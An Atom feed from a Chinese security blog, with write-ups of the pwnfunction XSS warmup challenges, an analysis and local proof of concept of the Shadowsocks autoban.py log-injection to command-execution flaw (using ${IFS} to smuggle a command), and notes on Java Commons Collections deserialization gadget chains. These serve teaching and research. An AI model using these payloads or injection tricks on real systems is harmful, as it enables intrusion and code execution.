<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>retanoj&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://retanoj.github.io/"/>
  <updated>2020-04-15T14:15:10.838Z</updated>
  <id>http://retanoj.github.io/</id>
  
  <author>
    <name>retanoj</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>XSS game of pwnfunction - Warmups</title>
    <link href="http://retanoj.github.io/2020/04/15/XSS-2020-04-15-XSS-game-of-pwnfunction-Warmups/"/>
    <id>http://retanoj.github.io/2020/04/15/XSS-2020-04-15-XSS-game-of-pwnfunction-Warmups/</id>
    <published>2020-04-15T11:06:42.000Z</published>
    <updated>2020-04-15T14:15:10.838Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xss.pwnfunction.com" target="_blank" rel="noopener">pwnfunction</a>网站上的XSS游戏，Warmups部分，也是比较简单的部分。</p><ul><li><h3 id="Ma-Spaghet"><a href="#Ma-Spaghet" class="headerlink" title="Ma Spaghet!"></a>Ma Spaghet!</h3></li></ul><p>签到题，没有任何过滤处理。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://sandbox.pwnfunction.com/warmups/ma-spaghet.html?somebody=%3Csvg/onload%3dalert(1337)%3E</span><br><span class="line"></span><br><span class="line">payload: <span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">alert(1337)</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><h3 id="Jefff"><a href="#Jefff" class="headerlink" title="Jefff"></a>Jefff</h3></li></ul><p>依然签到题，没有任何过滤处理</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://sandbox.pwnfunction.com/warmups/jefff.html?jeff=%22;alert(1337)-%22</span><br><span class="line"></span><br><span class="line">payload: ";alert(1337)-"</span><br></pre></td></tr></table></figure><ul><li><h3 id="Ugandan-Knuckles"><a href="#Ugandan-Knuckles" class="headerlink" title="Ugandan Knuckles"></a>Ugandan Knuckles</h3></li></ul><p>标签内event handler XSS。</p><p>可以在<a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank" rel="noopener">XSS cheat sheet</a>找到满足条件的payload。 onfocus 和 onfocusin 均可，autofocus之后就无限弹框了。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://sandbox.pwnfunction.com/warmups/da-wey.html?wey=hello%22%20autofocus%20onfocus%3d%22alert(1337)</span><br><span class="line"></span><br><span class="line">https://sandbox.pwnfunction.com/warmups/da-wey.html?wey=hello%22%20autofocus%20onfocusin%3d%22alert(1337)</span><br><span class="line"></span><br><span class="line">payload: hello" autofocus onfocus="alert(1337)</span><br></pre></td></tr></table></figure><ul><li><h3 id="Ricardo-Milos"><a href="#Ricardo-Milos" class="headerlink" title="Ricardo Milos"></a>Ricardo Milos</h3></li></ul><p>form action位置XSS，可以填入URL了。action位置倒还可以做URL Redirect。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://sandbox.pwnfunction.com/warmups/ricardo.html?ricardo=javascript:alert(1337);</span><br><span class="line"></span><br><span class="line">payload: javascript:alert(1337);</span><br></pre></td></tr></table></figure><ul><li><h3 id="Ah-That’s-Hawt"><a href="#Ah-That’s-Hawt" class="headerlink" title="Ah That’s Hawt"></a>Ah That’s Hawt</h3></li></ul><p>过滤了(，)，`和\，函数调用、编码和模板字符串都会有点限制。</p><p><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank" rel="noopener">XSS cheat sheet</a>没有现成可用的payload，但是可以找到思路。</p><p>用编码绕过吧。html entity和uri encode都可以。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">html entity</span><br><span class="line">https://sandbox.pwnfunction.com/warmups/thats-hawt.html?markassbrownlee=a%3Csvg/onload%3d%22alert%26%23x28%3B1337%26%23x29%3B%22%3E</span><br><span class="line"></span><br><span class="line">payload: a%3Csvg/onload%3d%22alert%26%23x28%3B1337%26%23x29%3B%22%3E</span><br><span class="line">decode: a<span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">"alert<span class="symbol">&amp;#x28;</span>1337<span class="symbol">&amp;#x29;</span>"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">uri encode</span><br><span class="line">https://sandbox.pwnfunction.com/warmups/thats-hawt.html?markassbrownlee=a%3Ciframe/src=%27javascript:alert%25281337%2529%27%3E</span><br><span class="line"></span><br><span class="line">payload: a<span class="tag">&lt;<span class="name">iframe</span>/<span class="attr">src</span>=<span class="string">'javascript:alert%281337%29'</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><h3 id="Ligma"><a href="#Ligma" class="headerlink" title="Ligma"></a>Ligma</h3></li></ul><p>eval内不能用printable字符了。显然<a href="http://www.jsfuck.com/" target="_blank" rel="noopener">jsfuck</a>可以干！</p><pre><code>https://sandbox.pwnfunction.com/warmups/ligma.html?balls=[][(![]%2b[])[%2b[]]%2b([![]]%2b[][[]])[%2b!%2b[]%2b[%2b[]]]%2b(![]%2b[])[!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b[]]%2b(!![]%2b[])[!%2b[]%2b!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b!%2b[]]][([][(![]%2b[])[%2b[]]%2b([![]]%2b[][[]])[%2b!%2b[]%2b[%2b[]]]%2b(![]%2b[])[!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b[]]%2b(!![]%2b[])[!%2b[]%2b!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b!%2b[]]]%2b[])[!%2b[]%2b!%2b[]%2b!%2b[]]%2b(!![]%2b[][(![]%2b[])[%2b[]]%2b([![]]%2b[][[]])[%2b!%2b[]%2b[%2b[]]]%2b(![]%2b[])[!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b[]]%2b(!![]%2b[])[!%2b[]%2b!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b!%2b[]]])[%2b!%2b[]%2b[%2b[]]]%2b([][[]]%2b[])[%2b!%2b[]]%2b(![]%2b[])[!%2b[]%2b!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b[]]%2b(!![]%2b[])[%2b!%2b[]]%2b([][[]]%2b[])[%2b[]]%2b([][(![]%2b[])[%2b[]]%2b([![]]%2b[][[]])[%2b!%2b[]%2b[%2b[]]]%2b(![]%2b[])[!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b[]]%2b(!![]%2b[])[!%2b[]%2b!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b!%2b[]]]%2b[])[!%2b[]%2b!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b[]]%2b(!![]%2b[][(![]%2b[])[%2b[]]%2b([![]]%2b[][[]])[%2b!%2b[]%2b[%2b[]]]%2b(![]%2b[])[!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b[]]%2b(!![]%2b[])[!%2b[]%2b!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b!%2b[]]])[%2b!%2b[]%2b[%2b[]]]%2b(!![]%2b[])[%2b!%2b[]]]((![]%2b[])[%2b!%2b[]]%2b(![]%2b[])[!%2b[]%2b!%2b[]]%2b(!![]%2b[])[!%2b[]%2b!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b!%2b[]]%2b(!![]%2b[])[%2b[]]%2b(![]%2b[][(![]%2b[])[%2b[]]%2b([![]]%2b[][[]])[%2b!%2b[]%2b[%2b[]]]%2b(![]%2b[])[!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b[]]%2b(!![]%2b[])[!%2b[]%2b!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b!%2b[]]])[!%2b[]%2b!%2b[]%2b[%2b[]]]%2b[%2b!%2b[]]%2b[!%2b[]%2b!%2b[]%2b!%2b[]]%2b[!%2b[]%2b!%2b[]%2b!%2b[]]%2b[!%2b[]%2b!%2b[]%2b!%2b[]%2b!%2b[]%2b!%2b[]%2b!%2b[]%2b!%2b[]]%2b(!![]%2b[][(![]%2b[])[%2b[]]%2b([![]]%2b[][[]])[%2b!%2b[]%2b[%2b[]]]%2b(![]%2b[])[!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b[]]%2b(!![]%2b[])[!%2b[]%2b!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b!%2b[]]])[!%2b[]%2b!%2b[]%2b[%2b[]]])()</code></pre><ul><li><h3 id="mafia"><a href="#mafia" class="headerlink" title="mafia"></a>mafia</h3></li></ul><p>50个字符内，限制大部分特殊字符的 XSS。</p><p>可以用两层eval来解。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://sandbox.pwnfunction.com/warmups/mafia.html?mafia=eval(/alerT(1337)/.source.toLowerCase())</span><br><span class="line"></span><br><span class="line">payload: eval(/alerT(1337)/.source.toLowerCase())</span><br></pre></td></tr></table></figure><p>还可以创建匿名函数来造成调用。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://sandbox.pwnfunction.com/warmups/mafia.html?mafia=Function(unescape(/aler%u0074(1337)/.source))()</span><br><span class="line"></span><br><span class="line">payload: Function(unescape(/aler%u0074(1337)/.source))()</span><br></pre></td></tr></table></figure><p>有意思的是，题目给出答案中，除了用<code>eval(location.hash.slice(1))</code>外，还用到了double dot语法。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">14.</span>.toString(<span class="number">10</span>)  <span class="comment">// 将数字14按10进制转成字符串</span></span><br><span class="line"><span class="number">14.0</span>.toString(<span class="number">10</span>) <span class="comment">// 这是等效的</span></span><br><span class="line">(<span class="number">14</span>).toString(<span class="number">10</span>) <span class="comment">// 这是等效的</span></span><br><span class="line"></span><br><span class="line"><span class="number">14.</span>toString(<span class="number">10</span>)   <span class="comment">// 不能用，因为无法分辨'.'是浮点数还是方法调用</span></span><br></pre></td></tr></table></figure><p>可以利用进制转换构造字符串”alert”，再eval就可以了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: eval(8680439..toString(30))(1337)</span><br></pre></td></tr></table></figure><ul><li><h3 id="Ok-Boomer"><a href="#Ok-Boomer" class="headerlink" title="Ok, Boomer"></a>Ok, Boomer</h3></li></ul><p>这个题目用到了DOMPurify，这是一个很有效的在前端防御XSS攻击的库。</p><p>然而，题目第二句的<code>ok</code>是不存在的，可以考虑DOM Clobbering了。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://sandbox.pwnfunction.com/warmups/ok-boomer.html?boomer=<span class="tag">&lt;<span class="name">a%20id%3Dok%20href%3D%22tel:alert(1)%22</span>&gt;</span></span><br><span class="line"></span><br><span class="line">payload: <span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">ok</span> <span class="attr">href</span>=<span class="string">"tel:alert(1)"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>用DOM Clobbering覆盖<code>ok</code>变量，<code>&lt;a&gt;</code>标签的href属性可以满足toString之后完整保留字符串。</p><p>然而，在href里用<code>javascript:</code>是不可以的，会被DOMPurify过滤掉。</p><p>参考<a href="https://github.com/cure53/DOMPurify/blob/master/src/regexp.js" target="_blank" rel="noopener">regexp.js</a>的<code>IS_ALLOWED_URI</code>部分，就找到一些可以用的protocol。比如<code>tel</code>，<code>xmpp</code>都可以用。</p><p>:} done</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://xss.pwnfunction.com&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;pwnfunction&lt;/a&gt;网站上的XSS游戏，Warmups部分，也是比较简单的部分。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;h3 id=&quot;M
      
    
    </summary>
    
      <category term="XSS" scheme="http://retanoj.github.io/categories/XSS/"/>
    
    
      <category term="XSS" scheme="http://retanoj.github.io/tags/XSS/"/>
    
      <category term="pwnfunction" scheme="http://retanoj.github.io/tags/pwnfunction/"/>
    
  </entry>
  
  <entry>
    <title>X41 D-Sec Shadowsocks RCE分析</title>
    <link href="http://retanoj.github.io/2017/11/14/Python-2017-10-14-X41-D-Sec-Shadowsocks-RCE%E5%88%86%E6%9E%90/"/>
    <id>http://retanoj.github.io/2017/11/14/Python-2017-10-14-X41-D-Sec-Shadowsocks-RCE分析/</id>
    <published>2017-11-13T16:00:00.000Z</published>
    <updated>2020-04-14T03:06:33.223Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>10月13号X41 D-Sec组织披露了有关Shadowsocks的一些漏洞，<a href="https://x41-dsec.de/lab/advisories/x41-2017-008-shadowsocks/" target="_blank" rel="noopener">文章在此</a>。以下对文中提及的日志文件写入和命令执行漏洞进行简要分析。</p><p>漏洞细节还是很简单的，但其中涉及到了一些小技巧还是可以提一提的。</p><h2 id="要点"><a href="#要点" class="headerlink" title="要点"></a>要点</h2><ol><li>日志文件写入漏洞原因在于Shadowsocks基于Socks5的代理是支持用域名作为连接目标的，在精心构造目标域名为可控内容时，Shadowsocks会将其直接写入日志。</li><li>命令执行漏洞原因在于Shadowsocks提供的用于检测与封禁暴力破解IP的autoban.py脚本在处理日志时不严谨，造成字符串拼接形式的命令执行。</li></ol><h2 id="LOG-FILE-MANIPULATION"><a href="#LOG-FILE-MANIPULATION" class="headerlink" title="LOG FILE MANIPULATION"></a>LOG FILE MANIPULATION</h2><p>角色有三：ss服务器端，ss客户端和用户端。</p><p>ss客户端作为socks5代理，在接收到用户端发送过来的请求后，会对请求进行解析。关键解析函数shadowsocks/common.py中parse_header(data)函数在判断请求目标地址类型为域名后，会将其写入日志文件。</p><p>ss客户端会将请求向后传输给ss服务器端，ss服务器端也会如上写入日志。</p><p>因此，如果可以控制用户端请求的目标地址部分，即可将任意内容写入日志。简单写个脚本如下，9001是ss客户端地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">eval_data = <span class="string">"foo\nbar\ntail"</span></span><br><span class="line"></span><br><span class="line">hello = <span class="string">"050100"</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line">target = (<span class="string">"05010003%02x%s0050"</span> % (len(eval_data), eval_data.encode(<span class="string">'hex'</span>))).decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">'127.0.0.1'</span>, <span class="number">9001</span>))</span><br><span class="line"></span><br><span class="line">s.send(hello)</span><br><span class="line"><span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(target)</span><br><span class="line"><span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><p>查看日志：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; cat /tmp/ss/client.log</span><br><span class="line"></span><br><span class="line">2017-10-14 20:34:00 INFO     connecting foo</span><br><span class="line">bar</span><br><span class="line">tail:80 from 127.0.0.1:62977</span><br></pre></td></tr></table></figure><p>可以看到，“bar”是单行写入的，漏洞触发成功。</p><h2 id="COMMAND-EXECUTION"><a href="#COMMAND-EXECUTION" class="headerlink" title="COMMAND EXECUTION"></a>COMMAND EXECUTION</h2><p>autoban.py脚本的作用是通过检查ss日志中的错误来对请求来源ip进行一些封禁处理。脚本处于shadowsocks/utils/autoban.py。</p><p>内容简短说就是按行查日志，如果出现</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">can not parse header when</span><br></pre></td></tr></table></figure><p>关键字符串在行内就进一步处理，最终提取来源IP拼接进cmd执行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd = <span class="string">'iptables -A INPUT -s %s -j DROP'</span> % ip</span><br><span class="line">os.system(cmd)</span><br></pre></td></tr></table></figure><p>也就是说，在日志内容可控的情况下，完全可以通过精心构造请求来达到ip的内容可控，从而造成命令执行。</p><p>这里有三个坑：</p><ol><li>命令内容不能有空格，不然被切开了</li><li>命令内容不能有冒号，不然被切开了</li><li>脚本查来源ip是有频次控制的，默认为3。也就是攻击请求需要发三次以上才会触发autoban的ban。</li></ol><p>源文中为了绕过空格限制，给出的POC用到了一个将日志作为脚本执行的方法，但并不是很好，因为需要知道ss的日志存储路径。如果路径非默认，就没用了。</p><p>这里需要提一下执行bash脚本不用空格的方法。主要用到了${IFS}环境变量，${IFS}=‘空格\n\t\00’，空格在第一个字符。<br>直接给出吧：</p><ol><li>echo “a${IFS:0:1}b” 从0位置截取1个字符，这里不能用，因为引入冒号了</li><li>echo “a${IFS%???}b” %逆向裁掉3个字符，?是占位符，这个可以用</li></ol><p>因此POC也呼之欲出了：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval_data = <span class="string">"can not parse header when ||touch<span class="variable">$&#123;IFS%???&#125;</span>&gt;<span class="variable">$&#123;IFS%???&#125;</span>/tmp/ss/eval.txt&amp;:\n"</span></span><br></pre></td></tr></table></figure></p><p>最后给出完成测试过程：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">启动ss服务端</span><br><span class="line">python server.py -s 127.0.0.1 -p 9000 -k 1234 --<span class="built_in">log</span>-file /tmp/ss/server.log --pid-file /tmp/ss/server.pid -d start</span><br><span class="line"></span><br><span class="line">启动ss客户端</span><br><span class="line">python local.py -s 127.0.0.1 -p 9000 -l 9001 -k 1234 --<span class="built_in">log</span>-file /tmp/ss/client.log --pid-file /tmp/ss/client.pid -d start</span><br><span class="line"></span><br><span class="line">模拟定时启动autoban.py脚本检查ss客户端日志</span><br><span class="line">watch -n 1 <span class="string">"python autoban.py &lt; /tmp/ss/client.log"</span></span><br><span class="line"></span><br><span class="line">执行POC(3次！！3次！！3次！！默认就是3次！！我就不写循环:)</span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">eval_data = <span class="string">"can not parse header when ||touch<span class="variable">$&#123;IFS%???&#125;</span>&gt;<span class="variable">$&#123;IFS%???&#125;</span>/tmp/ss/eval.txt&amp;:\n"</span></span><br><span class="line"></span><br><span class="line">hello = <span class="string">"050100"</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line">target = (<span class="string">"05010003%02x%s0050"</span> % (len(eval_data), eval_data.encode(<span class="string">'hex'</span>))).decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">'127.0.0.1'</span>, 9001))</span><br><span class="line"></span><br><span class="line">s.send(hello)</span><br><span class="line"><span class="built_in">print</span> s.recv(1024)</span><br><span class="line">s.send(target)</span><br><span class="line"><span class="built_in">print</span> s.recv(1024)</span><br><span class="line"></span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line">查看eval.txt是否存在</span><br><span class="line">ls -al /tmp/ss/eval.txt</span><br></pre></td></tr></table></figure></p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>谁没事儿会用autoban.py啊，大家的ss还是很安全的 :)</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;10月13号X41 D-Sec组织披露了有关Shadowsocks的一些漏洞，&lt;a href=&quot;https://x41-dsec.de/la
      
    
    </summary>
    
      <category term="Python" scheme="http://retanoj.github.io/categories/Python/"/>
    
    
      <category term="Python" scheme="http://retanoj.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Java反序列化漏洞原理小记</title>
    <link href="http://retanoj.github.io/2016/11/26/Java-2016-11-26-JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%B0%8F%E8%AE%B0/"/>
    <id>http://retanoj.github.io/2016/11/26/Java-2016-11-26-JAVA反序列化漏洞原理小记/</id>
    <published>2016-11-25T16:00:00.000Z</published>
    <updated>2018-12-12T02:20:05.723Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对于JAVA反序列化漏洞原理，<a href="http://www.angelwhu.com/blog/?p=394" title="java反序列化漏洞原理分析" target="_blank" rel="noopener">《java反序列化漏洞原理分析》</a>和<a href="https://blog.chaitin.com/2015-11-11_java_unserialize_rce/#h4.3_jenkins" title="Lib之过？Java反序列化漏洞通用利用分析" target="_blank" rel="noopener">《Lib之过？Java反序列化漏洞通用利用分析》</a>两篇文章已经分析的很是透彻了。<br>本篇小记是为了简要记录一下漏洞原理，以防忘记时可以快速查找。</p><h2 id="要点"><a href="#要点" class="headerlink" title="要点"></a>要点</h2><ol><li>待序列化类必须实现 Serializable 接口。 </li><li>反序列化过程会自动调用类的readObject(java.io.ObjectInputStream in)方法。 </li><li>反序列化命令执行的核心是ChainedTransformer，助手是被装饰的Map，自动触发是AnnotationInvocationHandler。</li></ol><h2 id="Payload外衣-—-TransformedMap"><a href="#Payload外衣-—-TransformedMap" class="headerlink" title="Payload外衣 — TransformedMap"></a>Payload外衣 — TransformedMap</h2><p>TransformedMap可被序列化，可以将任意Map对象生成相应的TransformedMap对象。<br>当一个TransformedMap对象的迭代对象被调用setValue()时，会触发</p><pre><code>Map.Entry.setValue() ==&gt; AbstractInputCheckedMapDecorator.MapEntry.setValue() ==&gt; TransformedMap.checkSetValue() ==&gt; valueTransformer.transform() </code></pre><p>如果valueTransformer为一个构造好的ChainedTransformer，即可执行exec()。</p><p>即：<em>一个 TransformedMap 在 setValue() 时可以 exec() 。</em></p><h2 id="Payload外衣-—-LazyMap"><a href="#Payload外衣-—-LazyMap" class="headerlink" title="Payload外衣 — LazyMap"></a>Payload外衣 — LazyMap</h2><p>LazyMap可被序列化，也可以给Map对象添加Transformer生成相应的LazyMap。<br>当LazyMap对象成员被调用get()时，会触发 </p><pre><code>this.factory.transform(key)</code></pre><p>如果factory为一个构造好的ChainedTransformer，即可执行exec()。</p><p>即：<em>一个 LazyMap 在 get() 时可以 exec() 。</em></p><h2 id="Payload核心-—-ChainedTransformer"><a href="#Payload核心-—-ChainedTransformer" class="headerlink" title="Payload核心 — ChainedTransformer"></a>Payload核心 — ChainedTransformer</h2><p>这里Payload以命令执行为目标。<br>ChainedTransformer可以将一系列Transformer串联组装起来，而在ConstantTransformer和InvokerTransformer的帮助下，恰好可以完成</p><pre><code>Runtime.getRuntime().exec(&quot;id&quot;);</code></pre><p>但是Runtime类未实现Serializable接口，需要利用反射的方法来完成调用，即：</p><pre><code>((Runtime)Runtime.class.getMethod(&quot;getRuntime&quot;).invoke(null, new Object[0])).exec(&quot;id&quot;)</code></pre><p>因此，ChainedTransformer构造如下：</p><pre><code>Transformer[] transformers = new Transformer[] {   new ConstantTransformer(Runtime.class),   new InvokerTransformer(&quot;getMethod&quot;, new Class[] {       String.class, Class[].class }, new Object[] {           getRuntime&quot;, new Class[0] }),   new InvokerTransformer(&quot;invoke&quot;, new Class[] {       Object.class, Object[].class }, new Object[] {           null, new Object[0] }),    new InvokerTransformer(&quot;exec&quot;, new Class[] {       String[].class }, new Object[] { &quot;id&quot; }),    new ConstantTransformer(1) };Transformer transformerChain = new ChainedTransformer(transformers);</code></pre><h2 id="Payload触发器-—-AnnotationInvocationHandler"><a href="#Payload触发器-—-AnnotationInvocationHandler" class="headerlink" title="Payload触发器 — AnnotationInvocationHandler"></a>Payload触发器 — AnnotationInvocationHandler</h2><p>以上所述要达到命令执行，需要对Map进行setValue()或get()操作。而我们需要让一个对象在被反序列化时，自动触发对Map的操作，从而执行命令。<br>AnnotationInvocationHandler类可被序列化，且拥有Map成员。该类的对象在被反序列化时，可以满足条件。</p><h3 id="装载TransformedMap"><a href="#装载TransformedMap" class="headerlink" title="装载TransformedMap"></a>装载TransformedMap</h3><p>在java 1.7中，AnnotationInvocationHandler类的readObject()方法存在对其Map成员的setValue()调用。当Map成员为一个构造好的TransformedMap，AnnotationInvocationHandler对象在被反序列化时，即可执行exec()。</p><p>即：<em>一个被构造了 TransformedMap 成员的 AnnotationInvocationHandler 在反序列化时可以 exec() 。</em></p><h3 id="装载LazyMap"><a href="#装载LazyMap" class="headerlink" title="装载LazyMap"></a>装载LazyMap</h3><p>AnnotationInvocationHandler类实现了InvocationHandler接口，可以代理其他对象。<br>被AnnotationInvocationHandler代理的对象进行方法调用时，会执行AnnotationInvocationHandler类的invoke()方法。<br>在AnnotationInvocationHandler类的invoke()方法中，存在对其Map成员的get()调用，因此在其代理的对象进行方法调用时，有可能执行exec()。<br>假设Map对象AAAMap被一个拥有LazyMap成员的AnnotationInvocationHandler类代理了，则AAAMap对象进行方法调用时（如AAAMap.get()）就会exec()。为了反序列化时就exec()，还需要将AAAMap装填在一个新的AnnotationInvocationHandler中，最终达到如下调用链： </p><pre><code>AIHandler1.readObject() ==&gt;AIHandler1.memberValues.xxx() ==&gt; // memberValues为被代理的AAAMapAIHandler2.invoke() ==&gt;AIHandler2.memberValues.get() ==&gt; // memberValues为构造的LazyMapChainedTransformer.transform() ==&gt;exec()</code></pre><p>即：<em>一个被构造了 LazyMap 成员的 AnnotationInvocationHandler 类代理的对象，在进行方法调用时可能执行 exec() 。</em></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;对于JAVA反序列化漏洞原理，&lt;a href=&quot;http://www.angelwhu.com/blog/?p=394&quot; title=&quot;ja
      
    
    </summary>
    
      <category term="Java" scheme="http://retanoj.github.io/categories/Java/"/>
    
    
      <category term="Java" scheme="http://retanoj.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>从Jekyll迁移到Hexo</title>
    <link href="http://retanoj.github.io/2016/10/31/Misc-2016-10-31-%E4%BB%8EJekyll%E8%BF%81%E7%A7%BB%E5%88%B0Hexo/"/>
    <id>http://retanoj.github.io/2016/10/31/Misc-2016-10-31-从Jekyll迁移到Hexo/</id>
    <published>2016-10-30T16:00:00.000Z</published>
    <updated>2018-12-12T02:20:05.727Z</updated>
    
